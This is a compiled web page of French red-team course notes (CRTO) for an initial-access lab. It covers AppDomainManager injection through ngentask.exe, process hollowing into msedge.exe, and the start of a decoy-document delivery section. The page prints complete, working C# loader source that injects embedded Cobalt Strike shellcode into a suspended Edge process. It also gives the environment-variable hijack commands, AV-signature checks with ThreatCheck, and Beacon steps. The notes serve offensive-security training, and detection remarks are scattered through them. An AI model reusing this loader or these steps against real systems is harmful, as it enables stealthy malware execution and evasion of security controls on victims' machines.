@@ -1,0 +1,318 @@
+import{_ as n,o as s,c as a,am as t}from"./chunks/framework.yj4qiWdr.js";const r="/skill-issue/assets/initial-access-lab-01.BQKM0kAR.png",o="/skill-issue/assets/initial-access-lab-02.dpQvdo31.png",i="/skill-issue/assets/initial-access-lab-03.BjCpkIpM.png",l="/skill-issue/assets/initial-access-lab-04.CNzkuE8H.png",c="/skill-issue/assets/initial-access-lab-05.ssdbR-1c.png",d="/skill-issue/assets/initial-access-lab-trigger.CeFFqcWI.png",p="/skill-issue/assets/initial-access-lab-06.Cihz-0aa.png",u="/skill-issue/assets/initial-access-lab-07.BjK5X3ye.png",m="/skill-issue/assets/initial-access-lab-08.CKVY-xzi.png",A=JSON.parse('{"title":"Lab — Initial Access","description":"","frontmatter":{"pageClass":"crto-page","prev":false,"next":false},"headers":[],"relativePath":"crto/liham/labs/Initial-Access-lab.md","filePath":"crto/liham/labs/Initial-Access-lab.md"}'),h={name:"crto/liham/labs/Initial-Access-lab.md"};function b(g,e,E,P,k,x){return s(),a("div",null,e[0]||(e[0]=[t('<h1 id="lab-—-initial-access" tabindex="-1">Lab — Initial Access <a class="header-anchor" href="#lab-—-initial-access" aria-label="Permalink to &quot;Lab — Initial Access&quot;">​</a></h1><blockquote><p><strong>Deux scénarios, un même lab.</strong> Cette fiche distingue l’examen Assume Breach, avec une session Windows déjà accessible, de l’exercice de livraison à distance présenté dans le cours.</p></blockquote><table tabindex="0"><thead><tr><th>Scénario</th><th>Situation</th><th>Objectif du cours</th></tr></thead><tbody><tr><td>Examen — Assume Breach</td><td>Identifiants et accès à la workstation fournis</td><td>Préparer la DLL du lab et étudier son chargement avec <code>ngentask.exe</code> ; ni ISO, ni LNK, ni phishing requis</td></tr><tr><td>Livraison à distance</td><td>Aucun accès direct à la session cible</td><td>Comprendre les risques du document leurre, du raccourci LNK, du conteneur ISO et de la distribution web</td></tr></tbody></table><p><strong>Point essentiel :</strong> la technique commune est le chargement d’une assembly via <code>AppDomainManager</code> et <code>ngentask.exe</code>, avec un scénario de Process Hollowing vers <code>msedge.exe</code>. Les étapes de livraison ne sont pas nécessaires dans la variante Assume Breach.</p><hr><h2 id="comprendre-appdomainmanager-injection" tabindex="-1">Comprendre AppDomainManager Injection <a class="header-anchor" href="#comprendre-appdomainmanager-injection" aria-label="Permalink to &quot;Comprendre AppDomainManager Injection&quot;">​</a></h2><p><strong>Principe :</strong> sous .NET Framework, une classe dérivée de <code>AppDomainManager</code> peut intervenir pendant l’initialisation d’un domaine d’application. Le runtime peut la charger selon les paramètres d’environnement fournis ; dans un contexte non maîtrisé, cette fonctionnalité peut être détournée.</p><p>Le cours étudie une DLL .NET possédant une classe <code>AppDomainManager</code>, les variables <code>APPDOMAIN_MANAGER_TYPE</code> et <code>APPDOMAIN_MANAGER_ASM</code>, et le chargement de cette DLL depuis un exécutable .NET Framework.</p><h3 id="pourquoi-ngentask-exe" tabindex="-1">Pourquoi <code>ngentask.exe</code> ? <a class="header-anchor" href="#pourquoi-ngentask-exe" aria-label="Permalink to &quot;Pourquoi `ngentask.exe` ?&quot;">​</a></h3><p><code>ngentask.exe</code> est un binaire lié à .NET Framework. Le lab présente une version conservée dans le magasin de composants Windows <code>WinSxS</code>. Le comportement exact varie selon les versions de Windows et du runtime.</p><p>La signature numérique d’un exécutable Microsoft ne garantit pas que les assemblies chargées dans son contexte soient toutes légitimes.</p><h3 id="pourquoi-msedge-exe" tabindex="-1">Pourquoi <code>msedge.exe</code> ? <a class="header-anchor" href="#pourquoi-msedge-exe" aria-label="Permalink to &quot;Pourquoi `msedge.exe` ?&quot;">​</a></h3><p>Le scénario décrit un Beacon fonctionnant dans un processus Microsoft Edge. Il sert à étudier les relations parent-enfant, les écritures mémoire et les connexions réseau. Le fait qu’un navigateur puisse légitimement accéder à Internet ne garantit pas que son activité échappe aux contrôles EDR.</p><h3 id="elements-opsec-a-controler" tabindex="-1">Éléments OPSEC à contrôler <a class="header-anchor" href="#elements-opsec-a-controler" aria-label="Permalink to &quot;Éléments OPSEC à contrôler&quot;">​</a></h3><table tabindex="0"><thead><tr><th>Élément</th><th>Catégorie des notes</th><th>Télémétrie potentielle</th></tr></thead><tbody><tr><td><code>AppDomainHijack.dll</code> sur disque</td><td>CAUTION</td><td>Présence du fichier, analyse statique et ressources intégrées</td></tr><tr><td><code>ngentask.exe</code></td><td>SAFE dans les notes</td><td>Processus signé et chargements associés</td></tr><tr><td>Variables <code>APPDOMAIN_MANAGER_*</code></td><td>SAFE dans les notes</td><td>Variables de session et chargement des assemblies</td></tr><tr><td>Process Hollowing vers <code>msedge.exe</code></td><td>SAFE dans les notes</td><td>Écritures en mémoire et arborescence des processus</td></tr><tr><td>Communications depuis <code>msedge.exe</code></td><td>SAFE dans les notes</td><td>Activité HTTP/S et journaux réseau</td></tr></tbody></table><p>Ces catégories OPSEC sont indicatives et <strong>ne garantissent pas l’absence de détection</strong>.</p><hr><h2 id="preparer-le-payload-du-lab" tabindex="-1">Préparer le payload du lab <a class="header-anchor" href="#preparer-le-payload-du-lab" aria-label="Permalink to &quot;Préparer le payload du lab&quot;">​</a></h2><p>La préparation se déroule sur l’Attacker Desktop Windows. Le Malleable C2 Profile, l’Artifact Kit et le Resource Kit sont étudiés dans la fiche Defense Evasion.</p><h3 id="generer-le-fichier-binaire-du-beacon" tabindex="-1">Générer le fichier binaire du Beacon <a class="header-anchor" href="#generer-le-fichier-binaire-du-beacon" aria-label="Permalink to &quot;Générer le fichier binaire du Beacon&quot;">​</a></h3><p>Dans Cobalt Strike, ouvrir <strong>Payloads &gt; Windows Stageless Payload</strong>. Le lab présente le listener <code>http</code>, le format <code>Raw</code> et le fichier <code>C:\\Payloads\\http_x64.xprocess.bin</code>.</p><p><strong>Explication :</strong> le format Raw produit des octets sans conteneur PE. Dans le scénario, ces données sont intégrées comme ressource à l’assembly .NET. Le suffixe <code>.xprocess.bin</code> est le nom choisi dans le lab.</p><img src="'+r+'" width="800"><h3 id="preparer-le-dossier-de-travail" tabindex="-1">Préparer le dossier de travail <a class="header-anchor" href="#preparer-le-dossier-de-travail" aria-label="Permalink to &quot;Préparer le dossier de travail&quot;">​</a></h3><p>Créer le répertoire <code>C:\\Payloads\\deals\\</code>, utilisé pour regrouper les fichiers d’exercice. Le reste de la fiche reprend ce chemin d’exemple.</p><h3 id="creer-le-projet-net-framework" tabindex="-1">Créer le projet .NET Framework <a class="header-anchor" href="#creer-le-projet-net-framework" aria-label="Permalink to &quot;Créer le projet .NET Framework&quot;">​</a></h3><p>Dans Visual Studio, créer une <strong>Class Library (.NET Framework)</strong> nommée <code>AppDomainHijack</code>, avec solution et projet dans le même répertoire.</p><p><strong>Pourquoi .NET Framework ?</strong> Les variables <code>APPDOMAIN_MANAGER_*</code> concernées par l’exercice appartiennent au modèle de chargement .NET Framework. Elles ne sont pas équivalentes aux mécanismes des versions modernes de .NET.</p><img src="'+o+'" width="800"><h3 id="ajouter-le-fichier-en-embedded-resource" tabindex="-1">Ajouter le fichier en Embedded Resource <a class="header-anchor" href="#ajouter-le-fichier-en-embedded-resource" aria-label="Permalink to &quot;Ajouter le fichier en Embedded Resource&quot;">​</a></h3><p>Dans Solution Explorer, sélectionner <strong>Add &gt; Existing Item</strong>, choisir <code>C:\\Payloads\\http_x64.xprocess.bin</code>, puis définir <strong>Build Action &gt; Embedded Resource</strong>.</p><p><strong>Explication :</strong> les octets du fichier sont inclus dans les ressources de la DLL. Le code du lab les lit avec <code>Assembly.GetManifestResourceStream(...)</code>. Le nom de ressource doit correspondre au nom attendu dans le projet.</p><p><strong>Observation :</strong> le fichier binaire inclus dans la DLL reste susceptible d’être contrôlé par Microsoft Defender et les outils d’analyse mémoire.</p><img src="'+i+`" width="800"><h3 id="examiner-le-code-class1-cs" tabindex="-1">Examiner le code <code>Class1.cs</code> <a class="header-anchor" href="#examiner-le-code-class1-cs" aria-label="Permalink to &quot;Examiner le code \`Class1.cs\`&quot;">​</a></h3><p>Le code suivant est celui du scénario de formation ; il est conservé pour référence.</p><pre><code>\`\`\`c
+using System;
+using System.IO;
+using System.Reflection;
+using System.Runtime.InteropServices;
+  
+namespace AppDomainHijack
+{
+    public sealed class DomainManager : AppDomainManager
+    {
+        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
+        {
+            var si = new STARTUPINFOA
+            {
+                cb = (uint)Marshal.SizeOf&lt;STARTUPINFOA&gt;(),
+                dwFlags = STARTUPINFO_FLAGS.STARTF_USESHOWWINDOW
+            };
+  
+            // create hidden + suspended msedge process
+            var success = CreateProcessA(
+                &quot;C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe&quot;,
+                &quot;\\&quot;C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\\&quot; --no-startup-window&quot;,
+                IntPtr.Zero,
+                IntPtr.Zero,
+                false,
+                PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW | PROCESS_CREATION_FLAGS.CREATE_SUSPENDED,
+                IntPtr.Zero,
+                &quot;C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\&quot;,
+                ref si,
+                out var pi);
+  
+            if (!success)
+                return;
+  
+            // get basic process information
+            var szPbi = Marshal.SizeOf&lt;PROCESS_BASIC_INFORMATION&gt;();
+            var lpPbi = Marshal.AllocHGlobal(szPbi);
+  
+            NtQueryInformationProcess(
+                pi.hProcess,
+                PROCESSINFOCLASS.ProcessBasicInformation,
+                lpPbi,
+                (uint)szPbi,
+                out _);
+  
+            // marshal data to structure
+            var pbi = Marshal.PtrToStructure&lt;PROCESS_BASIC_INFORMATION&gt;(lpPbi);
+            Marshal.FreeHGlobal(lpPbi);
+  
+            // calculate pointer to image base address
+            var lpImageBaseAddress = pbi.PebBaseAddress + 0x10;
+  
+            // buffer to hold data, 64-bit addresses are 8 bytes
+            var bImageBaseAddress = new byte[8];
+  
+            // read data from spawned process
+            ReadProcessMemory(
+                pi.hProcess,
+                lpImageBaseAddress,
+                bImageBaseAddress,
+                8,
+                out _);
+  
+            // convert address bytes to pointer
+            var baseAddress = (IntPtr)BitConverter.ToInt64(bImageBaseAddress, 0);
+  
+            // read pe headers
+            var data = new byte[512];
+  
+            ReadProcessMemory(
+                pi.hProcess,
+                baseAddress,
+                data,
+                512,
+                out _);
+  
+            // read e_lfanew
+            var e_lfanew = BitConverter.ToInt32(data, 0x3C);
+  
+            // calculate rva
+            var rvaOffset = e_lfanew + 0x28;
+            var rva = BitConverter.ToUInt32(data, rvaOffset);
+  
+            // calculate address of entry point
+            var lpEntryPoint = (IntPtr)((UInt64)baseAddress + rva);
+  
+            // read the shellcode
+            byte[ ] shellcode;
+  
+            var assembly = Assembly.GetExecutingAssembly();
+  
+            using (var rs = assembly.GetManifestResourceStream(&quot;AppDomainHijack.http_x64.xprocess.bin&quot;))
+            {
+                // convert stream to raw byte[ ]
+                using (var ms = new MemoryStream())
+                {
+                    rs.CopyTo(ms);
+                    shellcode = ms.ToArray();
+                }
+            }
+  
+            // copy shellcode into address of entry point
+            WriteProcessMemory(
+                pi.hProcess,
+                lpEntryPoint,
+                shellcode,
+                shellcode.Length,
+                out _);
+  
+            // resume process
+            ResumeThread(pi.hThread);
+        }
+  
+        [DllImport(&quot;KERNEL32.dll&quot;, ExactSpelling = true, SetLastError = true, CharSet = CharSet.Ansi)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        private static extern bool CreateProcessA(
+            string applicationName,
+            string commandLine,
+            IntPtr processAttributes,
+            IntPtr threadAttributes,
+            bool inheritHandles,
+            PROCESS_CREATION_FLAGS creationFlags,
+            IntPtr environment,
+            string currentDirectory,
+            ref STARTUPINFOA startupInfo,
+            out PROCESS_INFORMATION processInformation);
+  
+        [DllImport(&quot;ntdll.dll&quot;, ExactSpelling = true)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        private static extern uint NtQueryInformationProcess(
+            IntPtr processHandle,
+            PROCESSINFOCLASS processInformationClass,
+            IntPtr processInformation,
+            uint processInformationLength,
+            out uint returnLength);
+  
+        [DllImport(&quot;KERNEL32.dll&quot;, ExactSpelling = true, SetLastError = true)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        private static extern bool ReadProcessMemory(
+            IntPtr processHandle,
+            IntPtr baseAddress,
+            byte[ ] buffer,
+            UInt64 size,
+            out uint numberOfBytesRead);
+  
+        [DllImport(&quot;KERNEL32.dll&quot;, ExactSpelling = true, SetLastError = true)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        private static extern bool WriteProcessMemory(
+            IntPtr processHandle,
+            IntPtr baseAddress,
+            byte[ ] buffer,
+            int size,
+            out int numberOfBytesWritten);
+  
+        [DllImport(&quot;KERNEL32.dll&quot;, ExactSpelling = true, SetLastError = true)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        private static extern uint ResumeThread(IntPtr threadHandle);
+    }
+  
+    [Flags]
+    public enum PROCESS_CREATION_FLAGS : uint
+    {
+        DEBUG_PROCESS = 0x00000001,
+        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
+        CREATE_SUSPENDED = 0x00000004,
+        DETACHED_PROCESS = 0x00000008,
+        CREATE_NEW_CONSOLE = 0x00000010,
+        NORMAL_PRIORITY_CLASS = 0x00000020,
+        IDLE_PRIORITY_CLASS = 0x00000040,
+        HIGH_PRIORITY_CLASS = 0x00000080,
+        REALTIME_PRIORITY_CLASS = 0x00000100,
+        CREATE_NEW_PROCESS_GROUP = 0x00000200,
+        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
+        CREATE_SEPARATE_WOW_VDM = 0x00000800,
+        CREATE_SHARED_WOW_VDM = 0x00001000,
+        CREATE_FORCEDOS = 0x00002000,
+        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
+        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
+        INHERIT_PARENT_AFFINITY = 0x00010000,
+        INHERIT_CALLER_PRIORITY = 0x00020000,
+        CREATE_PROTECTED_PROCESS = 0x00040000,
+        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
+        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
+        PROCESS_MODE_BACKGROUND_END = 0x00200000,
+        CREATE_SECURE_PROCESS = 0x00400000,
+        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
+        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
+        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
+        CREATE_NO_WINDOW = 0x08000000,
+        PROFILE_USER = 0x10000000,
+        PROFILE_KERNEL = 0x20000000,
+        PROFILE_SERVER = 0x40000000,
+        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000
+    }
+  
+    public struct STARTUPINFOA
+    {
+        public uint cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public uint dwX;
+        public uint dwY;
+        public uint dwXSize;
+        public uint dwYSize;
+        public uint dwXCountChars;
+        public uint dwYCountChars;
+        public uint dwFillAttribute;
+        public STARTUPINFO_FLAGS dwFlags;
+        public ushort wShowWindow;
+        public ushort cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+  
+    [Flags]
+    public enum STARTUPINFO_FLAGS : uint
+    {
+        STARTF_FORCEONFEEDBACK = 0x00000040,
+        STARTF_FORCEOFFFEEDBACK = 0x00000080,
+        STARTF_PREVENTPINNING = 0x00002000,
+        STARTF_RUNFULLSCREEN = 0x00000020,
+        STARTF_TITLEISAPPID = 0x00001000,
+        STARTF_TITLEISLINKNAME = 0x00000800,
+        STARTF_UNTRUSTEDSOURCE = 0x00008000,
+        STARTF_USECOUNTCHARS = 0x00000008,
+        STARTF_USEFILLATTRIBUTE = 0x00000010,
+        STARTF_USEHOTKEY = 0x00000200,
+        STARTF_USEPOSITION = 0x00000004,
+        STARTF_USESHOWWINDOW = 0x00000001,
+        STARTF_USESIZE = 0x00000002,
+        STARTF_USESTDHANDLES = 0x00000100
+    }
+  
+    public struct PROCESS_INFORMATION
+    {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public uint dwProcessId;
+        public uint dwThreadId;
+    }
+  
+    public enum PROCESSINFOCLASS
+    {
+        ProcessBasicInformation = 0
+    }
+  
+    public struct PROCESS_BASIC_INFORMATION
+    {
+        public uint ExitStatus;
+        public IntPtr PebBaseAddress;
+        public ulong AffinityMask;
+        public int BasePriority;
+        public ulong UniqueProcessId;
+        public ulong InheritedFromUniqueProcessId;
+    }
+}
+\`\`\`
+</code></pre><blockquote><p><strong>Lecture du code :</strong> la classe <code>DomainManager</code> hérite de <code>AppDomainManager</code>. Le runtime .NET peut appeler <code>InitializeNewDomain()</code> au démarrage du processus hôte, avant l’exécution normale du programme.</p><p><strong>Partie 1 — Création d’un processus Edge suspendu :</strong></p></blockquote><blockquote><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>CreateProcessA(msedge.exe, CREATE_SUSPENDED | CREATE_NO_WINDOW, ...)</span></span></code></pre></div></blockquote><blockquote><p>Le lab utilise <code>CREATE_SUSPENDED</code> pour créer le thread principal sans démarrer son exécution, ainsi que <code>CREATE_NO_WINDOW</code> pour éviter l’ouverture d’une fenêtre. Ces indicateurs et la création du processus peuvent être visibles dans la télémétrie système.</p><p><strong>Partie 2 — Lecture des structures du processus :</strong></p></blockquote><blockquote><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>NtQueryInformationProcess → read PEB → read image base → read PE headers → calculate entry point</span></span></code></pre></div></blockquote><blockquote><p>Le <strong>PEB (Process Environment Block)</strong> contient notamment des informations sur l’exécutable chargé. L’exemple analyse les en-têtes PE, dont <code>ImageBaseAddress</code>, <code>e_lfanew</code> et <code>AddressOfEntryPoint</code>. Il illustre la différence entre une adresse relative RVA et une adresse virtuelle absolue.</p><p><strong>Partie 3 — Lecture de la ressource intégrée à la DLL :</strong></p></blockquote><blockquote><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>Assembly.GetManifestResourceStream(&quot;AppDomainHijack.http_x64.xprocess.bin&quot;)</span></span></code></pre></div></blockquote><blockquote><p>Le code lit les données binaires placées dans les ressources de l’assembly et les stocke dans un tableau <code>byte[]</code>. Une ressource intégrée reste présente dans le fichier DLL et peut être inspectée.</p><p><strong>Partie 4 — Écriture dans la mémoire du processus :</strong></p></blockquote><blockquote><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>WriteProcessMemory(pi.hProcess, lpEntryPoint, shellcode, ...)</span></span></code></pre></div></blockquote><blockquote><p>Cette partie illustre le principe du <strong>Process Hollowing</strong> : le code présent au point d’entrée d’un processus suspendu est remplacé, ce qui change son comportement à la reprise du thread.</p><p><strong>Partie 5 — Reprise du thread :</strong></p></blockquote><blockquote><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>ResumeThread(pi.hThread)</span></span></code></pre></div></blockquote><blockquote><p>Le thread suspendu est repris dans le scénario. Le cours présente ensuite une nouvelle session Beacon associée à <code>msedge.exe</code> et au team server Cobalt Strike.</p><p><strong>Observation OPSEC :</strong> les appels mémoire comme <code>WriteProcessMemory</code>, la création de processus et la modification de leur mémoire sont surveillables par les EDR. L’utilisation d’un exécutable Microsoft signé ne garantit pas l’absence de détection.</p><p><strong>Référence du cours :</strong> Process Hollowing, chapitre <em>Malware Essentials</em>.</p></blockquote><h3 id="compiler-et-verifier-la-dll" tabindex="-1">Compiler et vérifier la DLL <a class="header-anchor" href="#compiler-et-verifier-la-dll" aria-label="Permalink to &quot;Compiler et vérifier la DLL&quot;">​</a></h3><p>Dans Visual Studio, compiler le projet en mode <strong>Release</strong>. Le chemin de sortie présenté est :</p><p><code>C:\\Users\\Attacker\\source\\repos\\AppDomainHijack\\bin\\Release\\AppDomainHijack.dll</code></p><p><strong>Vérification :</strong> un chemin de sortie contenant <code>net8.0</code> peut indiquer qu’un projet .NET moderne a été choisi au lieu de la Class Library .NET Framework attendue.</p><p>Examiner ensuite la DLL générée avec ThreatCheck, selon les outils du lab :</p><blockquote><div class="language-cmd vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">cmd</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">C:\\Tools\\ThreatCheck\\ThreatCheck\\bin\\Debug\\ThreatCheck.exe </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">f </span><span style="--shiki-light:#032F62;--shiki-dark:#A5D6FF;">&quot;C:\\Users\\Attacker\\source\\repos\\AppDomainHijack\\bin\\Release\\AppDomainHijack.dll&quot;</span></span></code></pre></div></blockquote><blockquote><p><strong>Interprétation du résultat :</strong> une alerte ThreatCheck signale une correspondance avec certaines signatures utilisées par le moteur de test. L’absence d’alerte ne permet pas d’affirmer que le fichier ne sera pas détecté par d’autres contrôles.</p><p>Le cours compare les octets du payload et les paramètres du Malleable C2 Profile lorsqu’un résultat de détection est observé.</p></blockquote><h3 id="conserver-la-dll-dans-le-dossier-du-lab" tabindex="-1">Conserver la DLL dans le dossier du lab <a class="header-anchor" href="#conserver-la-dll-dans-le-dossier-du-lab" aria-label="Permalink to &quot;Conserver la DLL dans le dossier du lab&quot;">​</a></h3><p>Le bloc suivant reprend le transfert du fichier de l’exercice vers le dossier <code>deals</code> :</p><pre><code>\`\`\`Terminal-nocolor
+cp C:\\Users\\Attacker\\source\\repos\\AppDomainHijack\\bin\\Release\\AppDomainHijack.dll C:\\Payloads\\deals\\
+\`\`\`
+</code></pre><hr><h2 id="ngentask-—-chargement-avec-net-framework" tabindex="-1">NGenTask — Chargement avec .NET Framework <a class="header-anchor" href="#ngentask-—-chargement-avec-net-framework" aria-label="Permalink to &quot;NGenTask — Chargement avec .NET Framework&quot;">​</a></h2><h3 id="comprendre-le-role-de-ngentask-exe" tabindex="-1">Comprendre le rôle de <code>ngentask.exe</code> <a class="header-anchor" href="#comprendre-le-role-de-ngentask-exe" aria-label="Permalink to &quot;Comprendre le rôle de \`ngentask.exe\`&quot;">​</a></h3><p><code>ngentask.exe</code> appartient aux outils .NET Framework de Microsoft. Le magasin <code>WinSxS</code> peut conserver plusieurs versions des composants Windows pour assurer la compatibilité.</p><p>Le scénario étudie la réaction du runtime lorsque les variables <code>APPDOMAIN_MANAGER_TYPE</code> et <code>APPDOMAIN_MANAGER_ASM</code> désignent une classe de type <code>AppDomainManager</code>. Le cours illustre notamment l’appel à <code>InitializeNewDomain()</code>.</p><p><strong>Observation :</strong> un exécutable signé peut charger des assemblies supplémentaires. Les contrôles de sécurité doivent donc examiner les modules, les variables d’environnement et les appels mémoire associés, et pas seulement la signature du processus.</p><p>La commande suivante concerne la copie de la version <code>WinSxS</code> utilisée dans le lab.</p><pre><code>\`\`\`Terminal-nocolor
+cp C:\\Windows\\WinSxS\\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db\\ngentask.exe C:\\Payloads\\deals\\
+\`\`\`
+</code></pre><blockquote><p><strong>Pourquoi ce répertoire ?</strong> Le dossier <code>C:\\Payloads\\deals\\</code> sert de point de regroupement des fichiers du scénario. Le comportement de chargement de l’assembly dépend notamment de son identité et des chemins accessibles au runtime.</p></blockquote><h3 id="verifier-le-comportement-sur-la-workstation-du-lab" tabindex="-1">Vérifier le comportement sur la workstation du lab <a class="header-anchor" href="#verifier-le-comportement-sur-la-workstation-du-lab" aria-label="Permalink to &quot;Vérifier le comportement sur la workstation du lab&quot;">​</a></h3><p>Cette vérification correspond à l’environnement <strong>Assume Breach</strong> : les identifiants et la session de test sont déjà disponibles. Les étapes du document leurre, du raccourci LNK et de l’ISO ne sont pas requises pour cette partie.</p><ol><li><p>Se connecter au team server Cobalt Strike.</p></li><li><p>Ouvrir le dossier de l’exercice et examiner les deux variables d’environnement <code>APPDOMAIN_MANAGER_*</code>.</p><div class="language-PowerShell-linenums vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">PowerShell-linenums</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>cd C:\\Payloads\\deals</span></span>
+<span class="line"><span>$env:APPDOMAIN_MANAGER_TYPE = &#39;AppDomainHijack.DomainManager&#39;</span></span>
+<span class="line"><span>$env:APPDOMAIN_MANAGER_ASM = &#39;AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null&#39;</span></span></code></pre></div></li></ol><blockquote><p><strong>Variables d’environnement :</strong></p><ul><li><code>APPDOMAIN_MANAGER_TYPE</code> désigne le nom complet de la classe .NET (exemple : <code>AppDomainHijack.DomainManager</code>).</li><li><code>APPDOMAIN_MANAGER_ASM</code> désigne l’identité de l’assembly, avec son nom, sa version, sa culture et son <code>PublicKeyToken</code>.</li></ul><p>Ces paramètres sont associés à l’environnement de la session concernée ; ils ne sont pas nécessairement écrits dans le Registry ou conservés après la fermeture du processus.</p><p>Dans le scénario, le runtime .NET Framework lit ces valeurs pendant le démarrage de <code>ngentask.exe</code>.</p></blockquote><img src="`+l+`" width="800"><ol start="3"><li>Dans la session du lab, exécuter <code>.\\ngentask.exe</code>.</li><li>Vérifier si une nouvelle connexion Beacon est visible dans Cobalt Strike.</li></ol><p><strong>Contrôles de la session :</strong> examiner l’identité du compte avec <code>getuid</code> et le processus hôte avec <code>process_browser</code>, puis comparer les résultats aux attentes du lab.</p><blockquote><div class="language-cs vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">cs</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">beacon</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;"> getuid          </span><span style="--shiki-light:#6A737D;--shiki-dark:#8B949E;">// confirm running as the expected user</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">beacon</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;"> process_browser </span><span style="--shiki-light:#6A737D;--shiki-dark:#8B949E;">// GUI tab — confirm beacon PID is inside msedge.exe, check for EDR processes</span></span></code></pre></div></blockquote><blockquote><p><strong>Dépannage :</strong> en l’absence de connexion, vérifier que le listener HTTP du lab est actif, que le Malleable C2 Profile a bien été chargé et que les fichiers du scénario se trouvent dans le répertoire attendu.</p></blockquote><hr><h2 id="partie-complementaire-—-livraison-a-distance" tabindex="-1">Partie complémentaire — Livraison à distance <a class="header-anchor" href="#partie-complementaire-—-livraison-a-distance" aria-label="Permalink to &quot;Partie complémentaire — Livraison à distance&quot;">​</a></h2><p><strong>Cette partie n’est pas nécessaire dans le scénario d’examen Assume Breach.</strong> Les sections suivantes décrivent un exercice pédagogique portant sur les leurres et sur la façon dont les mécanismes de sécurité de Windows peuvent être sollicités lors d’une livraison à distance.</p><h3 id="document-leurre-decoy" tabindex="-1">Document leurre (Decoy) <a class="header-anchor" href="#document-leurre-decoy" aria-label="Permalink to &quot;Document leurre (Decoy)&quot;">​</a></h3><p><strong>Principe :</strong> un document Office réel peut être associé à un raccourci. Le lab utilise un classeur Excel <code>deals.xlsx</code> pour illustrer ce que voit l’utilisateur, en parallèle des opérations effectuées par le raccourci.</p><p><strong>Observation de sécurité :</strong> un document sans macros n’implique pas que les éléments qui le lancent soient légitimes. Les associations de fichiers, raccourcis et commandes parent-enfant doivent être examinés séparément.</p><ol><li><p>Créer un classeur de démonstration dans Excel.</p></li><li><p>Utiliser les données fictives de l’exercice pour reconnaître le document.</p></li><li><p>Le cours mentionne aussi l’outil Office <code>OSPPREARM.EXE</code> dans le contexte de son environnement de lab.</p><div class="language-xlsx-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">xlsx-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>id  product      discount  code</span></span>
+<span class="line"><span>1   Prodder      56%       54473-150</span></span>
+<span class="line"><span>2   Viva         9%        0378-5713</span></span>
+<span class="line"><span>3   Aerified     22%       43742-0187</span></span>
+<span class="line"><span>4   Zaam-Dox     26%       35356-687</span></span>
+<span class="line"><span>5   Rank         41%       63323-300</span></span>
+<span class="line"><span>6   Pannier      61%       50804-302</span></span>
+<span class="line"><span>7   Wrapsafe     32%       67046-223</span></span>
+<span class="line"><span>8   Voltsillam   58%       55910-721</span></span>
+<span class="line"><span>9   Ventosanzap  4%        0485-0051</span></span>
